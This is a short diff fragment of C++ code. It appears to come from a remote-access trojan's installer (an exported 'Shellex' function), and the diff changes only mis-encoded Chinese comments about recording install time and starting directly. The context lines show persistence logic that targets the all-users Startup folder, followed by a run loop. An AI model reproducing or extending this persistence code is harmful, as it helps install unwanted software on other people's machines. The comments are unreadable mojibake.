-			MarkTime(modify_data.SerName); //Ğ´Èë°²×°Ê±¼äĞÅÏ¢
+			MarkTime(modify_data.SerName); //å†™å…¥å®‰è£…æ—¶é—´ä¿¡æ¯
 			
 			char StartupPath[MAX_PATH]={NULL};
 			if (!pSHGetSpecialFolderPathA(NULL,StartupPath,CSIDL_COMMON_STARTUP,FALSE))
@@ -1788,10 +1788,10 @@ extern "C" __declspec(dllexport) LPVOID Shellex(MODIFY_DATA m_Install)
 			}
 		}
 	}
-	else //ÂÌÉ«°²×°Ö±½ÓÆô¶¯
+	else //ç»¿è‰²å®‰è£…ç›´æ¥å¯åŠ¨
 	{
 		InstallMode = 0;
-		MarkTime(modify_data.SerName); //Ğ´Èë°²×°Ê±¼äĞÅÏ¢
+		MarkTime(modify_data.SerName); //å†™å…¥å®‰è£…æ—¶é—´ä¿¡æ¯
 		while(1)
 		{
 			Sleep(50);
